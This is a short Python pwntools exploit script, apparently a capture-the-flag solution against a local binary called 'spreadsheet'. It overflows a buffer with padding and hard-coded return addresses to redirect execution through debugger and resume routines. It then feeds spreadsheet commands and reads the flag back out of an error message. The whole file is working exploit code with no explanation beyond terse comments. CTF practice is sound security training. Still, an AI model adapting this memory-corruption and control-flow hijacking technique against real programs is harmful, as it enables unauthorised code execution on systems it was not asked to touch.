from pwn import *

p = process('./spreadsheet')

'''
adjust SP
'''
payload = 'C' * 0x10 + p64(0x401939) 
payload += 'B' * 0x28 + p64(0x401939) 

'''
run Debugger:~Debugger agian
'''
payload += 'B' * 0x28 + p64(0x4017cf)

'''
set it to retrigger Resume
'''
payload += 'A' * 0x10 + p64(0x4019d2)

payload += '\n'
payload += "w10=10\n"
payload += "w0+ 1 10\n"
payload += "w2+ 1 0\n"
payload += "w10=0\n"
payload += "r2"
p.sendline(payload)

p.recvuntil('Expected ')
first_part = p64(int(p.recvuntil(' but found ', drop=True)))
second_part = p64(int(p.recvuntil('\n', drop=True)))
flag = first_part + second_part
print flag

p.close()

